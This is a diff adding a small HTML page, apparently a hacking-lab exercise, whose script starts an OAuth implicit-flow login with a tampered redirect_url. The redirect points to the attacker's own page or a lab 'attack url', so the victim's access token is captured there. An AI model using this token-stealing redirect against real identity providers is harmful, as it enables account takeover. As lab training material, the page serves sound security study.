@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Landing page</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+</head>
+
+<body>
+    <h1>Landing</h1>
+    <button id="btn">
+        click me
+    </button>
+    <script>
+        const btn = document.getElementById('btn')
+        btn.addEventListener("click", async () => await triggerAuth(), false);
+        async function triggerAuth() {
+            console.log('triggerauth called. Current url: ' + location.href);
+            
+            // origUrl
+            let returnUrl = 'https%3A%2F%2Fprintabookv2.compass-demo.com%2Fcallback'; // original just to see (as this is just to demo)
+            // example attack url
+            returnUrl = encodeURIComponent('https://b8a30173-7065-4676-a06f-54746f8bd69c.idocker.vuln.land/landing.html');
+            // url to be used (as we redirect to the same page)
+            returnUrl = location.href;
+
+            const url = `https://mypix.compass-demo.com/authorize?response_type=token&client_id=c075fa13858988e5c50c8b71f8df39da&redirect_url=${returnUrl}&state=Wtv4c8BC4u1wrqp3BezV&tracking_id=43aa6c80-14c8-4277-b90b-578e8110ee9f&scope=private`;
+            console.log('about to redirect to: ' + url);
+            document.location.href = url;
+        } 
+    </script>
+</body>
+
+</html>
